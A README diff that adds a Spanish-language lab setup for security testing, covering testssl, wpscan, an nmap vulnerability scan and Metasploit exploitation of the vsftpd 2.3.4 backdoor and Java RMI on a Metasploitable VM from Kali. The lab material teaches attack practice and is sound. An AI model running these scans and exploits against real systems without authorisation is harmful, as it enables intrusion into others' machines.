@@ -206,3 +206,52 @@ cd ~/ceiot_base/TSIOT/system/frontend_test
 npm install
 npm test
 ```
+
+# Setup para testing de seguridad
+
+## testssl
+
+    sudo apt install testssl.sh
+    
+## wpscan
+
+    sudo apt install ruby-dev ubuntu-dev-tools
+    sudo gem install wpscan
+
+Obtener una API KEY en https://wpscan.com/api
+
+    wpscan --url $TARGET --api-token="$KEY"
+    
+## metasploit + metasploitable
+
+Obtener la virtual de metasploitable en https://information.rapid7.com/download-metasploitable-2017.html y poner en marcha.
+
+Obtener una virtual Kali en https://www.kali.org/get-kali/, ya sea instalando o bajando la VM y poner en marcha.
+
+En una terminal obtener los servicios vulnerables:
+
+    nmap -v --script vuln -p 21,1099 $METASPLOITABLE_IP
+    
+En la misma u otra terminal, para el puerto 21 (ftp), explotar:    
+    
+    msfconsole
+    use exploit/unix/ftp/vsftpd_234_backdoor
+    set RHOSTS $METASPLOITABLE_IP
+    exploit
+    
+Luego, para rmi (1099) igual pero con otro exploit:
+
+    use exploit/multi/misc/java_rmi_server
+
+Más información en https://docs.rapid7.com/metasploit/msf-overview/
+
+
+    
+    
+    
+
+
+
+    
+    
+
